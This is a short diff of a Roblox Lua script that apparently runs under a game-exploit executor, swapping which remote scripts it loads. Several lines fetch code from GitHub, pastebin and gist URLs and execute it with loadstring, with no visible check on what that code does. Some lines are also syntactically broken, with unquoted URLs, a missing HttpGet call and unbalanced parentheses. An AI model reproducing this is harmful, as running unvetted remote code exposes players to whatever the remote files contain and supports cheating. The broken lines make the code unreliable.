@@ -18,8 +18,7 @@ local startTime = os.clock()
 repeat wait() until game:IsLoaded()
 
 
-loadstring(https://raw.githubusercontent.com/curry1212z/randomtest12234/refs/heads/main/Powerful.lua))()
-
+loadstring("https://raw.githubusercontent.com/curry1212z/randomtest12234/refs/heads/main/adonis.lua"))()
 if not LPH_OBFUSCATED then
     LPH_JIT = function(...) return ... end
 LPH_NO_VIRTUALIZE  = function(...) return ... end
@@ -37,7 +36,7 @@ local assetsupport = string.find(identifyexecutor(), "Wave") or string.find(iden
 if assetsupport then
     Library = loadstring(game:HttpGet("https://pastebin.com/raw/LixdnWjB", true))()
 else
-    Library  = loadstring(game:HttpGet("https://gist.githubusercontent.com/CongoOhioDog/35476decfcca390e13120470a8907d26/raw/ec47708b7c28850ea497567972fee63c91f5a893/lol",true))()
+    Library  = loadstring(game:HttpGet(https://raw.githubusercontent.com/curry1212z/randomtest12234/refs/heads/main/Powerful.lua))()
 end
 
 
